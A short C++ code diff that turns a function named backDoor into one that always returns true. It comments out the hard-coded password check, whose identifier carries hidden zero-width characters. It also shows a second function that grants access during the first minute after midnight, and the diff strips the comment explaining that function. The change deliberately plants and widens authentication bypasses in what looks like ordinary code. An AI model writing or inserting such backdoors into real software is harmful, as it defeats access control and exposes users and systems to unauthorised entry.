@@ -33,22 +33,21 @@ string getSHA256(const string &input)
 
 bool backDoor(const string &password)
 {
-    if (password == backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​)
+    /* if (password == backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​)
     {
         return true;
     }
     else
     {
         return false;
-    }
+    } */
+    return true;
 }
 
 bool timestampBackdoor()
 {
     time_t now = time(0);
     tm *ltm = localtime(&now);
-
-    // Check if the current time is between 12:00 AM and 12:01 AM
     if (ltm->tm_hour == 0 && ltm->tm_min == 0)
     {
         return true;
